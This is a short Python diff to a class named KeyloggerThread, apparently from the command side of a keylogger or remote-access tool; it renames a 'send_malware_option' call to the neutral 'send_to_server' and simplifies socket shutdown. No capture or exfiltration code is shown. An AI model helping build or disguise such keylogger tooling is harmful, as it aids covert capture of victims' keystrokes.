@@ -11,7 +11,7 @@ class KeyloggerThread(threading.Thread):
 
     def run(self):
         time.sleep(0.1)
-        send_malware_option(self.client_socket, KEYLOGGER_OPTION)
+        send_to_server(self.client_socket, KEYLOGGER_OPTION)
 
         while not self.disconnect_socket.is_set():
             try:
@@ -25,5 +25,5 @@ class KeyloggerThread(threading.Thread):
     def stop(self):
         self.disconnect_socket.set()
         self.join()
-        disconnect(self.client_socket)
+        self.client_socket.close()
         self.disconnect_socket.clear()
